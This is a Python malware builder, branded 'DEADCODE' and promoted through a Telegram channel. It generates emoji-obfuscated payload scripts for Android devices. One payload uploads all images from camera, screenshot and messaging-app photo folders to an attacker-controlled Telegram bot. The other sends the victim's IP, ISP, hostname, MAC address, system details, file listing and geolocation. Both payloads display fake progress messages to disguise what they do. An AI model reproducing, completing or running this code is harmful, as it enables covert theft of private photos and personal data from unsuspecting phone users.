import requests
from datetime import datetime
import os
import time
from colorama import Fore, Style, init

os.system('pip install emojify')

E = '\033[1;31m'
B = '\033[1;36m'
G = '\033[1;32m'
S = '\033[1;33m'
W = '\033[1;97m'

os.system('clear')


print(Style.RESET_ALL)
print(Style.BRIGHT)
print(Fore.GREEN)
print('''
          ▐▮▌ ▞▖ ▙ ▚▞▚▞ ▞▖ █▘ █☰                                                                                                 
  
         -   𝐌𝐚𝐥𝐰𝐚𝐫𝐞   -  V = 2.1   ''')

print(f'''      {B}{E}==============================
      |{G}[+] GitHub    : {B}deadcode22   {E}|
      |{G}[+] Developer : {B}DEADCODE     {E}|
      |{G}[+] TeleGram  : {B}Black_Code_22{E}|
      {E}==============================''')
print('               M A L W A R E                     ')      
print('''\033[1;34m        https://t.me/black_code_22       
       https://github.com/deadcode22\n\n''')    

print('\033[1;35m    You must subscribe to this channel   \n')              
#os.system(f'xdg-open https://youtube.com/@memo-network')
time.sleep(3)       
os.system(f'xdg-open https://t.me/black_code_22')
time.sleep(3)
   
id=input(W+f'  [{E} ** {W}]  {S}Telegram ID ==> {B}')
token=input(W+f'  [{E} ** {W}]  {S}Token Bot ==> {B}')

print(f'      {E}==============================')

skript = str(f"""import os
os.system('pip install requests')
os.system('clear')
import requests
from datetime import datetime

def banner():
    print ('\t         \033[2;33m   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
    print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
    print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
    print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m DEAD CODE ')
    print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
    print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
    print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')

banner()
print('')
print('')
    
def res(file):
    requests.post(f'https://api.telegram.org/bot"""+token+'''/sendDocument?chat_id='''+id+"""', files=file)

d = datetime.now()        
tlg = requests.post(f'https://api.telegram.org/bot"""+token+"/sendMessage?chat_id="+id+"""&text=👊 Start Attack .... ✊   '+str(d))

os.chdir(r"/storage/emulated/0/DCIM")
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}
          res(file)          
      except:
          pass
  else:
       pass
       
print('\033[2;31m  [ * ] \033[2;34m Check internet .... ')     

print('')
        
os.chdir(r"/storage/emulated/0/DCIM/Screenshots")
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}
          res(file)
      except:
          pass
  else:
       pass  

print('\033[2;31m  [ ✓ ] \033[2;32m Connection ......') 

print('')
                                              
os.chdir(r"/storage/emulated/0/DCIM/Camera")   
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}   
          res(file)
      except:
          pass
  else:
       pass     

print('\033[34;1m  [ ✔ ] \033[33;1m Watting ......... ')   

print('')
                      
os.chdir(r"/storage/emulated/0/Pictures/Telegram")   
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}   
          res(file)
      except:
          pass
  else:
       pass 
       
print('\033[36;1m  [ ✘ ] \033[32;1m Start Toole .......')   
print('')
    
os.chdir(r"/storage/emulated/0/Pictures/Instagram")   
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}      
          res(file)
      except:
          pass
  else:
       pass  
       
print('\033[0;1m  [ × ] \033[31;1m DEADCODE ......  ')   
print('')      

os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' or 'png' in i.name:
      try:
          file ={"document": open(f'{i.name}', 'rb')}    
          res(file)
      except:
          pass
  else:
       pass   

exit(' D E A D C O D E ')""" )

hack = str('''import requests
import geocoder 
import os
import socket
import sys
import time
from glob import glob
from datetime import datetime
from platform import *
from getmac import get_mac_address as gma

def install(pip):
    os.system(f'pip install {pip}')
install('getmac') 
install('platform')   
install('glob')
install('socket')
install('geocoder')
install('requests')
os.system('clear')

token = '''+f'"{token}"'+'''  
id = '''+id+'''  

def banner():
    print ('\t         \033[2;33m   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
    print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
    print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
    print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m DEAD CODE ')
    print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
    print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
    print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
    print('')
    print("\t\033[1;36m         https://t.me/black_code_22  ")

banner()
print('')

tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=👊 Start Attack .... ✊  {datetime.now()} ')

print('\033[2;31m  [ * ] \033[2;34m Check internet .... ')
print('')
                            
ip = requests.get("https://api.ipify.org").text
with open('TargetIP.txt','w') as IP:
    IP.write(f' [ ✓ ]  IP TARGET ~» {ip} ')
    IP.close()
    file = {'document':open('TargetIP.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)

print('\033[2;31m  [ ✓ ] \033[2;32m Connection ......')
print('') 

print('\033[34;1m  [ ✔ ] \033[33;1m Watting ......... ')
print('')

result = requests.get(f'http://ip-api.com/json/{ip}').json()       
with open('Netowrk-info.txt','w') as AS:
    AS.write(f' [ ✓ ] Net Work information data » ....  {result["isp"]} ')
    AS.close()
    file = {'document':open('Netowrk-info.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)   

print('\033[36;1m  [ ✘ ] \033[32;1m Start Toole .......')
print('') 
         
host = socket.gethostname()
local = socket.gethostbyname(host)    
with open('Hostname.txt','w') as Hn:
    Hn.write(f' [ ✓ ] Host Name ~» {host} ☞ {local} ')
    Hn.close()
    file = {'document':open('Hostname.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)

print('\033[0;1m  [ × ] \033[31;1m DEADCODE ......  ')
print('')
                
re = release()
pv = python_version()
pl = platform()
ma = machine()
ve = version()    
with open('Sysinfo.txt','w') as S:
    S.write(f' [ ✓ ] System information » ....  release => {re}  python_version => {pv}  platform => {pl}  machine => {ma}  version => {ve} ')
    S.close()
    file = {'document':open('Sysinfo.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)

mac = gma()        
with open('MacAddress.txt','w') as M:
    M.write(f' [ ✓ ] MAC ADDRESS ~» {mac} ')    
    M.close()
    file = {'document':open('MacAddress.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)

g = glob("/storage/emulated/0/*")
with open('DirSystem-path.txt','w') as D:
    D.write(f' [ ✓ ] dirs in all pwd system » .... ')    
    for i in g:
        D.write(i+'    ,    ')
    D.close()
    file = {'document':open('DirSystem-path.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)

our_ip = geocoder.ip(ip).latlng
map_lenr = our_ip[0]
map_lenl = our_ip[1]
with open('Location.txt','w') as Jbs:
    Jbs.write(f' [ ✓ ] Victim-Location-IP » ....  https://www.google.com/maps/@{map_lenr},{map_lenl},13z')
    Jbs.close()
    file = {'document':open('Location.txt','rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
              
    
tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @Black_Code_22 ✅ ')''')

#os.system(f'xdg-open https://t.me/Black_Code_22')

print(W+f'''  [{E} 01 {W}] Attack Image Hack ..... 
{W}  [{E} 02 {W}] Attack infrmation System ....''')
print('')

black = int(input(W+' [ × ] '+'\033[1;35m  Enter opation : '+G))
print('\n')

if black == 1:
    namee=input(W+f'  [{E} ** {W}]  {S}Name Skript ==> {B}')
    with open(f'enc_{namee}.py','w') as code:
        code.write(skript)
        
elif black == 2:
    namee=input(W+f'  [{E} ** {W}]  {S}Name Skript ==> {B}')
    with open(f'enc_{namee}.py','w') as co:
        co.write(hack)   
else:
     exit(' E R O R R E ') 

os.system(f'emojify --input enc_{namee}.py --output {namee}.py --emoji')
os.system(f'rm -rf enc_{namee}.py')

print(f'    {G} ✅ DONE SAVE IN {namee}.py ✅ ')                                                      
